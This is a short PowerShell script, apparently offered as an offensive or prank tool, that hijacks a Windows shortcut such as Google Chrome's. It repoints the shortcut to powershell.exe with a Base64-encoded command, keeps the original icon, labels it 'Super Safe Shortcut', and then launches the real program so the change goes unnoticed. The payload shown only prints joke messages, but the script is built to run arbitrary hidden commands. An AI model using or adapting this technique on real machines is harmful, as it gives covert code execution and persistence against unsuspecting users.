<#
.Synopsis
   Backdoors a windows shortcut with arbitrary powershell execution
.DESCRIPTION
   To modify the icon of the shortcut, feel free to modify the $iconapp variable
.EXAMPLE
   .\bd-lnk.ps1 -sourcepath "$env:homepath\desktop\Google Chrome.lnk"
.EXAMPLE
   Another example of how to use this cmdlet
#>
Param
    (
        $sourcepath = 'C:\Users\Public\Desktop\Google Chrome.lnk'
    )
$fname = (gci $sourcepath | Select-Object -First 1).name
$destination = $env:HOMEPATH + "\trollz\"
$backupdir = $destination + "linkbackup\"
$shortcut = $destination + $fname

if (Test-Path $destination){Write-Host "$destination is hurr"}
    else {mkdir $destination}

if (Test-Path $backupdir){Write-Host "$backupdir is hurr"}
    else {mkdir $backupdir}

function backdoor-link($sourcepath, $destination){

    #copy link to temp dir and store target values
    Copy-Item $sourcepath $destination  ## Get the lnk we want to use as a template
    Copy-Item $sourcepath $backupdir
    $shell = New-Object -COM WScript.Shell
    $shortcut = $shell.CreateShortcut($shortcut)  ## Open the lnk
    $oldicon = $shortcut.TargetPath
    $oldpath = $shortcut.TargetPath -replace '^', "'" -replace '$', "'"
    $oldargs = $shortcut.Arguments

    # append origional link target to troll string
    $string = 'write-host "pookie was here"; write-host "dont worry, nothing fishy going on here..."; write-host "executing RM -RF /" ; sleep 3'
    $string += ';'
    $string += "& $oldpath $oldargs"
    $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
    $ctcommand = [text.encoding]::Unicode.GetString([convert]::FromBase64String($encodedcommand))

    # Backdoor Link, Redirect flow to origional location
    $shortcut.TargetPath = 'C:\windows\system32\windowspowershell\v1.0\powershell.exe'  ## Target Powershell
    $shortcut.Arguments = "-EncodedCommand $encodedcommand"
    $shortcut.Description = "Super Safe Shortcut"  ## This is the "Comment" field
    $shortcut.IconLocation = $oldicon
    $shortcut.Save()  ## Save
}

backdoor-link -sourcepath $sourcepath -destination $destination
Copy-Item ($destination + $fname) $sourcepath
